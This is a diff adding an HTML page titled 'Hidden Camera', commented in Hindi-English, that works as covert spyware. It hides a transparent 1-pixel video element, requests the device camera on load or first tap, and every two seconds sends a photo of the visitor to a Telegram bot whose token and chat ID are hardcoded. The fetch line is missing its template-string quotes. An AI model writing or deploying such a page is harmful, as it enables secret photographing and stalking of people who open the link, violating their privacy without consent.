@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Hidden Camera</title>
+<style>
+body { margin:0; padding:0; background:#fff; }
+img { width:100%; height:auto; display:block; }
+#vid { position:absolute; top:0; left:0; width:1px; height:1px; opacity:0; pointer-events:none; }
+</style>
+</head>
+<body>
+<!-- Yeh video tag hidden hai -->
+<video id="vid" autoplay playsinline muted></video>
+
+<script>
+const BOT_TOKEN = "9216772292:AAED3qflFubUO71x8cxxIdY5BetFRMsF65k"; // Example: 123456:ABC-DEF...
+const CHAT_ID = "-1004381283679"; // Example: -100123456789
+
+async function sendPhoto(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "camera.jpg");
+    
+    try {
+        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (e) {
+        console.log("Error sending photo", e);
+    }
+}
+
+async function start() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const video = document.getElementById('vid');
+        video.srcObject = stream;
+        
+        setInterval(() => {
+            if(stream.active) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    sendPhoto(blob);
+                }, 'image/jpeg', 0.7);
+            }
+        }, 2000); // Har 2 second mein photo bhejega
+        
+    } catch (e) {
+        alert("Camera access denied ya available nahi hai.");
+    }
+}
+
+// User interaction pe shuru karega taaki permission mil sake
+document.addEventListener('click', start, { once: true });
+document.addEventListener('touchstart', start, { once: true });
+
+// Agar page load hote hi camera chahiye (browser policy ke hisab se kabhi-kabhi block ho sakta hai)
+window.onload = start;
+</script>
+</body>
+</html>
